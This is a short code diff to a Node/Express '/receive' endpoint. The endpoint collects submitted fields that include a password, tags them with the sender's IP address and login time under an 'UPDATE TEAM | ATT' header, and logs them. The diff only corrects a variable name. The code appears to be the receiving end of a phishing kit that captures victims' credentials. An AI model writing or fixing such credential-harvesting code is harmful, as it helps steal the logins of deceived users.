@@ -101,7 +101,7 @@ app.post('/receive', async (req, res) => {
 
   if (myObjects.includes('Password')) {
     message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
-               `👤 ${myObjects['loginTime']}\n\n`;
+               `👤 ${myObject['loginTime']}\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
